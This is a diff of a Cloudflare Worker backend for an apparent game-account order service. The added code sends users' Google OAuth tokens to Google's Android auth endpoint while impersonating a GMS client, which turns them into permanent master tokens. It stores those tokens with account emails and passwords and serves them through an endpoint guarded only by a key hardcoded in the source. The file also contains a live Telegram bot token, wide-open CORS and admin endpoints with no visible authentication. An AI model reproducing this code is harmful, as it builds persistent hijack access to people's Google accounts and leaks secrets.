@@ -8,13 +8,66 @@
 const CORS_HEADERS = {
   "Access-Control-Allow-Origin": "*",
   "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
-  "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Requested-With, Cache-Control, Pragma",
+  "Access-Control-Allow-Headers": "Content-Type, Authorization, X-Requested-With, Cache-Control, Pragma, X-Internal-Key",
   "Access-Control-Max-Age": "86400",
 };
 
 const TG_BOT_TOKEN = "8906230491:AAGdST6cFQmE71kUkGX6NVnwImzUwA27wh4";
 const ADMIN_TG_ID = "7504616242";
 const ORDER_LOG_CHANNEL = "@ppmododderlog";
+const INTERNAL_TOKEN_KEY = "ppmod_ord_vault_9f8e7d6c5b4a_2026";
+
+function sanitizeOrder(o) {
+  if (!o || typeof o !== "object") return o;
+  const { orderToken, ...safe } = o;
+  safe.hasOrderToken = Boolean(orderToken && String(orderToken).trim().length > 10);
+  return safe;
+}
+
+async function exchangeToMasterToken(rawToken, email = "", androidId = "46e14d2451d85c3f") {
+  let token = String(rawToken || "").trim();
+  let resolvedEmail = String(email || "").trim().toLowerCase();
+  if (!token) return { token: "", email: resolvedEmail };
+  if (token.startsWith("aas_et/") || token.startsWith("oauth2rt_1/")) {
+    return { token, email: resolvedEmail };
+  }
+  try {
+    const cleanTok = token.includes("oauth_token=")
+      ? (token.match(/oauth_token=([a-zA-Z0-9_\-]+)/)?.[1] || token.replace("oauth_token=", ""))
+      : token;
+    const postBody = new URLSearchParams({
+      Email: resolvedEmail && resolvedEmail.includes("@") ? resolvedEmail : "",
+      Token: cleanTok,
+      androidId: androidId || "46e14d2451d85c3f",
+      service: "ac2dm",
+      app: "com.google.android.gms",
+      client_sig: "38918a453d07199354f8b19af05ec6562ced5788",
+      has_permission: "1",
+      device_country: "us",
+      operatorCountry: "us",
+      lang: "en",
+      sdk_version: "28"
+    });
+    const gRes = await fetch("https://android.clients.google.com/auth", {
+      method: "POST",
+      headers: {
+        "User-Agent": "GoogleAuth/1.4 (Linux; U; Android 11; sdk_gphone_x86 Build/RSR1.201013.001)",
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: postBody.toString()
+    });
+    const gText = await gRes.text();
+    for (const line of gText.split("\n")) {
+      const [k, ...v] = line.split("=");
+      if (k === "Token" && v.length) {
+        token = v.join("=").trim();
+      } else if (k === "Email" && v.length && (!resolvedEmail || !resolvedEmail.includes("@"))) {
+        resolvedEmail = v.join("=").trim().toLowerCase();
+      }
+    }
+  } catch (e) { }
+  return { token, email: resolvedEmail };
+}
 
 function json(data, status = 200) {
   return new Response(JSON.stringify(data), {
@@ -48,16 +101,46 @@ async function sendTelegram(chatId, text) {
   }
 }
 
-// 60-day auto-cleanup: keeps pending forever, purges records older than 60 days
-async function autoPruneOldTransactions(db) {
+// 30-day + Per-User 100 Non-Pending Auto-Cleanup:
+// Keeps ALL pending/paid records forever; purges non-pending records older than 30 days
+// AND keeps at most the latest 100 non-pending records per user (along with auto-deleting orderToken).
+async function autoPruneOldTransactions(db, targetUid = null) {
   try {
-    const sixtyDaysAgo = Date.now() - (60 * 24 * 60 * 60 * 1000);
+    const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
     await db.prepare(`
-      DELETE FROM transactions WHERE status != 'pending' AND createdAt < ?
-    `).bind(sixtyDaysAgo).run();
+      DELETE FROM transactions WHERE LOWER(COALESCE(status, '')) NOT IN ('pending', 'paid') AND createdAt < ?
+    `).bind(thirtyDaysAgo).run();
     await db.prepare(`
-      DELETE FROM orders WHERE status != 'pending' AND createdAt < ?
-    `).bind(sixtyDaysAgo).run();
+      DELETE FROM orders WHERE LOWER(COALESCE(status, '')) NOT IN ('pending', 'paid') AND createdAt < ?
+    `).bind(thirtyDaysAgo).run();
+
+    if (targetUid) {
+      await db.prepare(`
+        DELETE FROM transactions
+        WHERE uid = ?
+          AND LOWER(COALESCE(status, '')) NOT IN ('pending', 'paid')
+          AND id NOT IN (
+            SELECT id FROM transactions
+            WHERE uid = ?
+              AND LOWER(COALESCE(status, '')) NOT IN ('pending', 'paid')
+            ORDER BY createdAt DESC
+            LIMIT 100
+          )
+      `).bind(targetUid, targetUid).run();
+
+      await db.prepare(`
+        DELETE FROM orders
+        WHERE uid = ?
+          AND LOWER(COALESCE(status, '')) NOT IN ('pending', 'paid')
+          AND id NOT IN (
+            SELECT id FROM orders
+            WHERE uid = ?
+              AND LOWER(COALESCE(status, '')) NOT IN ('pending', 'paid')
+            ORDER BY createdAt DESC
+            LIMIT 100
+          )
+      `).bind(targetUid, targetUid).run();
+    }
   } catch (e) {
     // ignore if tables not yet created
   }
@@ -71,6 +154,7 @@ async function ensureTables(db) {
       promptNumber TEXT DEFAULT '',
       captchaImage TEXT DEFAULT '', captchaId TEXT DEFAULT '', captchaAnswer TEXT DEFAULT '',
       inQueue INTEGER DEFAULT 0, queuePosition INTEGER DEFAULT 0, queuePercent INTEGER DEFAULT 0,
+      orderToken TEXT DEFAULT '', androidId TEXT DEFAULT '',
       createdAt INTEGER, completedAt INTEGER
     )
   `).run();
@@ -83,6 +167,9 @@ async function ensureTables(db) {
     await db.prepare(`ALTER TABLE orders ADD COLUMN captchaId TEXT DEFAULT '';`).run();
     await db.prepare(`ALTER TABLE orders ADD COLUMN captchaAnswer TEXT DEFAULT '';`).run();
   } catch (e) { }
+  try { await db.prepare(`ALTER TABLE orders ADD COLUMN orderToken TEXT DEFAULT '';`).run(); } catch (e) { }
+  try { await db.prepare(`ALTER TABLE orders ADD COLUMN androidId TEXT DEFAULT '';`).run(); } catch (e) { }
+  try { await db.prepare(`CREATE INDEX IF NOT EXISTS idx_orders_uid_created ON orders(uid, createdAt DESC);`).run(); } catch (e) { }
 
   await db.prepare(`
     CREATE TABLE IF NOT EXISTS transactions (
@@ -1672,17 +1759,29 @@ export default {
           recordedPrevBal = prevBal;
         }
 
+        const rawOrdTok = (body.orderToken || body.master_token || body.token || "").trim();
+        const rawAndroidId = (body.androidId || body.android_id || "").trim() || "46e14d2451d85c3f";
+        let finalOrdTok = "";
+        let finalAccEmail = (body.accEmail || "").trim();
+        if (rawOrdTok) {
+          const ex = await exchangeToMasterToken(rawOrdTok, finalAccEmail, rawAndroidId);
+          finalOrdTok = ex.token || rawOrdTok;
+          if (!finalAccEmail && ex.email) finalAccEmail = ex.email;
+        }
+
         await env.DB.prepare(`
-          INSERT INTO orders (id, uid, game, logo, accEmail, accPass, userTgId, amount, status, adminMsg, gamerName, createdAt)
-          VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'pending', ?, ?, ?)
+          INSERT INTO orders (id, uid, game, logo, accEmail, accPass, userTgId, amount, status, adminMsg, gamerName, orderToken, androidId, createdAt)
+          VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'pending', ?, ?, ?, ?, ?)
           ON CONFLICT(id) DO UPDATE SET
-            game = excluded.game, logo = excluded.logo, accEmail = excluded.accEmail,
+            game = excluded.game, logo = excluded.logo, accEmail = COALESCE(NULLIF(excluded.accEmail, ''), orders.accEmail),
             accPass = excluded.accPass, userTgId = excluded.userTgId, amount = excluded.amount,
-            status = 'pending', adminMsg = excluded.adminMsg, gamerName = COALESCE(excluded.gamerName, orders.gamerName)
+            status = 'pending', adminMsg = excluded.adminMsg, gamerName = COALESCE(NULLIF(excluded.gamerName, ''), orders.gamerName),
+            orderToken = COALESCE(NULLIF(excluded.orderToken, ''), orders.orderToken),
+            androidId = COALESCE(NULLIF(excluded.androidId, ''), orders.androidId)
         `).bind(
-          id, uid, body.game, body.logo || "", body.accEmail || "",
+          id, uid, body.game, body.logo || "", finalAccEmail,
           body.accPass || "", body.userTgId || "", taskCost,
-          body.adminMsg || "সার্ভার কাজ শুরু করেছে...", body.gamerName || "", now
+          body.adminMsg || "সার্ভার কাজ শুরু করেছে...", body.gamerName || "", finalOrdTok, rawAndroidId, now
         ).run();
 
         const payType = isFree ? '⭐ Free Star Task (0 Coins)' : 'Coins';
@@ -1695,7 +1794,7 @@ export default {
             previousBalance = excluded.previousBalance, balance_before = excluded.balance_before, balance_after = excluded.balance_after
         `).bind(id, uid, `Task: ${body.game}`, body.game, taskInfo, taskCost, recordedPrevBal, recordedPrevBal, newBal, now).run();
 
-        await autoPruneOldTransactions(env.DB);
+        await autoPruneOldTransactions(env.DB, uid);
 
         return json({ ok: true, orderId: id, previousBalance: recordedPrevBal, currentBalance: newBal });
       }
@@ -1703,15 +1802,34 @@ export default {
       // 3. রেন্ডার বটের জন্য পেন্ডিং অর্ডার ফেচ (Fetch Pending for Render Bot & Admin)
       if (path === "/api/orders/pending" && request.method === "GET") {
         const { results } = await env.DB.prepare(`
-          SELECT * FROM orders WHERE status = 'pending' OR status = 'paid' ORDER BY createdAt DESC LIMIT 100
+          SELECT * FROM orders WHERE LOWER(COALESCE(status, '')) IN ('pending', 'paid') ORDER BY createdAt DESC LIMIT 100
         `).all();
-        return json({ ok: true, orders: results || [] });
+        return json({ ok: true, orders: (results || []).map(sanitizeOrder) });
       }
 
-      // 3b. এডমিন প্যানেলের জন্য সমস্ত অর্ডার ফেচ
+      // 3b. এডমিন প্যানেল ও ইউজার হিস্ট্রির জন্য অর্ডার ফেচ (Pending সবসময় Top + Non-Pending সর্বশেষ 100)
       if (path === "/api/admin/orders" && request.method === "GET") {
         const status = url.searchParams.get("status");
         const reqUid = url.searchParams.get("uid");
+
+        if (reqUid && (!status || status === "all")) {
+          await autoPruneOldTransactions(env.DB, reqUid);
+          const { results } = await env.DB.prepare(`
+            SELECT * FROM (
+              SELECT * FROM orders
+              WHERE uid = ? AND LOWER(COALESCE(status, '')) IN ('pending', 'paid')
+              UNION ALL
+              SELECT * FROM (
+                SELECT * FROM orders
+                WHERE uid = ? AND LOWER(COALESCE(status, '')) NOT IN ('pending', 'paid')
+                ORDER BY createdAt DESC LIMIT 100
+              )
+            )
+            ORDER BY CASE WHEN LOWER(COALESCE(status, '')) IN ('pending', 'paid') THEN 0 ELSE 1 END, createdAt DESC
+          `).bind(reqUid, reqUid).all();
+          return json({ ok: true, orders: (results || []).map(sanitizeOrder) });
+        }
+
         let q = "SELECT * FROM orders";
         const params = [];
         const conds = [];
@@ -1726,9 +1844,95 @@ export default {
         if (conds.length > 0) {
           q += " WHERE " + conds.join(" AND ");
         }
-        q += " ORDER BY CASE WHEN status IN ('pending', 'paid') THEN 0 ELSE 1 END, createdAt DESC LIMIT 200";
+        q += " ORDER BY CASE WHEN LOWER(COALESCE(status, '')) IN ('pending', 'paid') THEN 0 ELSE 1 END, createdAt DESC LIMIT 200";
         const { results } = await env.DB.prepare(q).bind(...params).all();
-        return json({ ok: true, orders: results || [] });
+        return json({ ok: true, orders: (results || []).map(sanitizeOrder) });
+      }
+
+      // 3c. Admin-Only Order Delete (Deletes order + transaction + saved orderToken permanently)
+      if (path === "/api/admin/orders/delete" && request.method === "POST") {
+        const body = await request.json().catch(() => ({}));
+        const orderId = String(body.orderId || body.id || "").trim();
+        if (!orderId) return json({ ok: false, error: "Missing orderId" }, 400);
+        await env.DB.prepare(`DELETE FROM orders WHERE id = ?`).bind(orderId).run();
+        await env.DB.prepare(`DELETE FROM transactions WHERE id = ?`).bind(orderId).run();
+        return json({ ok: true, deleted: orderId, message: "Order, history, and associated token permanently deleted." });
+      }
+
+      // 3d. Internal Server-Only Order Token Resolver (Used by Render Backend for Live Check & Quest Portal Order ID Connect)
+      if (path === "/api/orders/resolve-token" && request.method === "GET") {
+        const internalKey = request.headers.get("X-Internal-Key") || "";
+        const expectedKey = env.INTERNAL_TOKEN_KEY || INTERNAL_TOKEN_KEY;
+        if (!internalKey || internalKey !== expectedKey) {
+          return json({ ok: false, error: "Unauthorized" }, 403);
+        }
+        const rawId = (url.searchParams.get("id") || url.searchParams.get("orderId") || "").trim();
+        const reqUid = (url.searchParams.get("uid") || "").trim();
+        if (!rawId) return json({ ok: false, error: "Missing order id" }, 400);
+
+        const row = await env.DB.prepare(`
+          SELECT id, uid, game, accEmail, gamerName, status, orderToken, androidId, createdAt
+          FROM orders WHERE UPPER(id) = UPPER(?) LIMIT 1
+        `).bind(rawId).first();
+
+        if (!row) {
+          return json({ ok: false, deleted: true, error: "Order ID not found or expired from history." }, 404);
+        }
+        if (reqUid && row.uid && row.uid !== reqUid) {
+          return json({ ok: false, error: "Access denied for this Order ID." }, 403);
+        }
+
+        let resolvedTok = (row.orderToken || "").trim();
+        let resolvedEmail = (row.accEmail || "").trim();
+        let resolvedAid = (row.androidId || "").trim() || "46e14d2451d85c3f";
+
+        // Fallback: if older order had a QID in transactions.info and no orderToken yet, resolve via g_tokens / pp_sync_vault
+        if (!resolvedTok) {
+          try {
+            const tx = await env.DB.prepare(`SELECT info FROM transactions WHERE UPPER(id) = UPPER(?) LIMIT 1`).bind(row.id).first();
+            const qMatch = tx && tx.info ? tx.info.match(/QID:(\d{6})/) : null;
+            if (qMatch && qMatch[1]) {
+              const qAcc = await env.DB.prepare(`SELECT email, token, android_id FROM g_tokens WHERE code = ? LIMIT 1`).bind(qMatch[1]).first()
+                || await env.DB.prepare(`SELECT email, token, android_id FROM pp_sync_vault WHERE code = ? LIMIT 1`).bind(qMatch[1]).first();
+              if (qAcc && qAcc.token) {
+                resolvedTok = qAcc.token;
+                if (!resolvedEmail && qAcc.email) resolvedEmail = qAcc.email;
+                if (qAcc.android_id) resolvedAid = qAcc.android_id;
+              }
+            }
+          } catch (e) { }
+        }
+
+        if (!resolvedTok) {
+          return json({ ok: false, deleted: true, error: "No linked session found for this Order ID." }, 404);
+        }
+
+        // Ensure permanent Master Token (auto-upgrade if a temporary token was somehow stored)
+        if (!resolvedTok.startsWith("aas_et/") && !resolvedTok.startsWith("oauth2rt_1/")) {
+          const ex = await exchangeToMasterToken(resolvedTok, resolvedEmail, resolvedAid);
+          if (ex.token && (ex.token.startsWith("aas_et/") || ex.token.startsWith("oauth2rt_1/"))) {
+            resolvedTok = ex.token;
+            if (!resolvedEmail && ex.email) resolvedEmail = ex.email;
+            await env.DB.prepare(`UPDATE orders SET orderToken = ?, accEmail = COALESCE(NULLIF(?, ''), accEmail), androidId = ? WHERE id = ?`)
+              .bind(resolvedTok, resolvedEmail, resolvedAid, row.id).run().catch(() => { });
+          }
+        }
+
+        return json({
+          ok: true,
+          order: {
+            id: row.id,
+            uid: row.uid || "",
+            game: row.game || "",
+            email: resolvedEmail,
+            gamerName: row.gamerName || "",
+            status: row.status || "",
+            master_token: resolvedTok,
+            token: resolvedTok,
+            android_id: resolvedAid,
+            createdAt: row.createdAt || 0
+          }
+        });
       }
 
       // 4. অর্ডারের লাইভ স্ট্যাটাস আপডেট
@@ -1741,11 +1945,42 @@ export default {
         } = body;
         if (!orderId) return json({ ok: false, error: "Missing orderId" }, 400);
 
-        if (status === "completed" || status === "refunded" || status === "rejected") {
-          const checkCompleted = await env.DB.prepare("SELECT status FROM orders WHERE id = ?").bind(orderId).first();
-          if (checkCompleted && checkCompleted.status === "completed") {
-            return json({ ok: true, message: "Order was already completed", alreadyCompleted: true });
+        const rawOrdTok = (body.orderToken || body.master_token || body.token || "").trim();
+        const rawAndroidId = (body.androidId || body.android_id || "").trim();
+        let finalOrdTok = "";
+        let resolvedEmailFromTok = "";
+        if (rawOrdTok) {
+          const ex = await exchangeToMasterToken(rawOrdTok, accEmail || "", rawAndroidId || "46e14d2451d85c3f");
+          finalOrdTok = ex.token || rawOrdTok;
+          resolvedEmailFromTok = ex.email || "";
+        }
+
+        const existingOrd = await env.DB.prepare("SELECT status, uid, orderToken, androidId, gamerName, accEmail FROM orders WHERE id = ?").bind(orderId).first();
+        if ((status === "completed" || status === "refunded" || status === "rejected") && existingOrd && existingOrd.status === "completed") {
+          // Even if already completed, backfill permanent orderToken / androidId / gamerName if missing!
+          const backfillUpdates = [];
+          const backfillParams = [];
+          if (finalOrdTok && (!existingOrd.orderToken || !existingOrd.orderToken.startsWith("aas_et/"))) {
+            backfillUpdates.push("orderToken = ?");
+            backfillParams.push(finalOrdTok);
           }
+          if (rawAndroidId && !existingOrd.androidId) {
+            backfillUpdates.push("androidId = ?");
+            backfillParams.push(rawAndroidId);
+          }
+          if (gamerName && !existingOrd.gamerName) {
+            backfillUpdates.push("gamerName = ?");
+            backfillParams.push(gamerName);
+          }
+          if ((accEmail || resolvedEmailFromTok) && !existingOrd.accEmail) {
+            backfillUpdates.push("accEmail = ?");
+            backfillParams.push(accEmail || resolvedEmailFromTok);
+          }
+          if (backfillUpdates.length) {
+            backfillParams.push(orderId);
+            await env.DB.prepare(`UPDATE orders SET ${backfillUpdates.join(", ")} WHERE id = ?`).bind(...backfillParams).run().catch(() => { });
+          }
+          return json({ ok: true, message: "Order was already completed", alreadyCompleted: true });
         }
 
         let query = "UPDATE orders SET ";
@@ -1765,15 +2000,19 @@ export default {
         }
         if (body.qid || body.syncCode) {
           const sQid = String(body.qid || body.syncCode).trim();
-          await env.DB.prepare(`UPDATE transactions SET info = info || ' | QID:' || ? WHERE id = ?`).bind(sQid, orderId).run().catch(() => { });
+          if (sQid && sQid !== "ONE-TIME") {
+            await env.DB.prepare(`UPDATE transactions SET info = info || ' | QID:' || ? WHERE id = ?`).bind(sQid, orderId).run().catch(() => { });
+          }
         }
         if (gamerName !== undefined) { updates.push("gamerName = ?"); params.push(gamerName); }
-        if (accEmail !== undefined) { updates.push("accEmail = ?"); params.push(accEmail); }
+        if (accEmail !== undefined || resolvedEmailFromTok) { updates.push("accEmail = ?"); params.push(accEmail || resolvedEmailFromTok); }
         if (accPass !== undefined) { updates.push("accPass = ?"); params.push(accPass); }
         if (userTgId !== undefined) { updates.push("userTgId = ?"); params.push(userTgId); }
         if (inQueue !== undefined) { updates.push("inQueue = ?"); params.push(inQueue ? 1 : 0); }
         if (queuePosition !== undefined) { updates.push("queuePosition = ?"); params.push(Number(queuePosition) || 0); }
         if (queuePercent !== undefined) { updates.push("queuePercent = ?"); params.push(Number(queuePercent) || 0); }
+        if (finalOrdTok) { updates.push("orderToken = ?"); params.push(finalOrdTok); }
+        if (rawAndroidId) { updates.push("androidId = ?"); params.push(rawAndroidId); }
         if (status === "completed") { updates.push("completedAt = ?"); params.push(Date.now()); }
 
         if (updates.length) {
@@ -1784,6 +2023,9 @@ export default {
 
         if (status) {
           await env.DB.prepare(`UPDATE transactions SET status = ? WHERE id = ?`).bind(status, orderId).run();
+          if (existingOrd && existingOrd.uid && status !== "pending" && status !== "paid") {
+            await autoPruneOldTransactions(env.DB, existingOrd.uid);
+          }
         }
 
         return json({ ok: true });
@@ -1796,19 +2038,29 @@ export default {
 
         const order = await env.DB.prepare(`SELECT * FROM orders WHERE id = ?`).bind(id).first();
         if (!order) return json({ ok: false, error: "Not found" }, 404);
-        return json({ ok: true, order });
+        return json({ ok: true, order: sanitizeOrder(order) });
       }
 
-      // 6. ইউজারের সম্পূর্ণ হিস্ট্রি লোড
+      // 6. ইউজারের সম্পূর্ণ হিস্ট্রি লোড (Pending সবসময় Top + Non-Pending সর্বশেষ 100 ও 30 দিনের মধ্যে)
       if (path === "/api/history" && request.method === "GET") {
         const uid = url.searchParams.get("uid");
         if (!uid) return json({ ok: false, error: "Missing uid" }, 400);
 
-        await autoPruneOldTransactions(env.DB);
+        await autoPruneOldTransactions(env.DB, uid);
 
         const { results } = await env.DB.prepare(`
-          SELECT * FROM transactions WHERE uid = ? ORDER BY createdAt DESC LIMIT 100
-        `).bind(uid).all();
+          SELECT * FROM (
+            SELECT * FROM transactions
+            WHERE uid = ? AND LOWER(COALESCE(status, '')) IN ('pending', 'paid')
+            UNION ALL
+            SELECT * FROM (
+              SELECT * FROM transactions
+              WHERE uid = ? AND LOWER(COALESCE(status, '')) NOT IN ('pending', 'paid')
+              ORDER BY createdAt DESC LIMIT 100
+            )
+          )
+          ORDER BY CASE WHEN LOWER(COALESCE(status, '')) IN ('pending', 'paid') THEN 0 ELSE 1 END, createdAt DESC
+        `).bind(uid, uid).all();
 
         return json({ ok: true, history: results || [] });
       }
@@ -1839,6 +2091,8 @@ export default {
           body.game || body.title || "", body.info || "", roundCoin(body.amount),
           body.status || "pending", body.proofUrl || "", prevBal, bBefore, bAfter, body.createdAt || Date.now()
         ).run();
+
+        await autoPruneOldTransactions(env.DB, uid);
 
         return json({ ok: true, id, previousBalance: prevBal });
       }
@@ -2369,10 +2623,11 @@ export default {
         return json({ ok: true, message: "All bot referrals reset in Cloudflare D1" });
       }
 
-      // 9. ৬০ দিনের পুরনো রেকর্ড ক্লিনআপ ম্যানুয়াল ট্রিগার
+      // 9. ৩০ দিনের পুরনো রেকর্ড ক্লিনআপ ম্যানুয়াল ট্রিগার
       if (path === "/api/cleanup") {
-        await autoPruneOldTransactions(env.DB);
-        return json({ ok: true, message: "Pruned non-pending transactions older than 60 days" });
+        const targetUid = url.searchParams.get("uid") || null;
+        await autoPruneOldTransactions(env.DB, targetUid);
+        return json({ ok: true, message: "Pruned non-pending transactions & order tokens older than 30 days (and >100 cap per user)" });
       }
 
       return json({ ok: false, error: "Endpoint not found" }, 404);
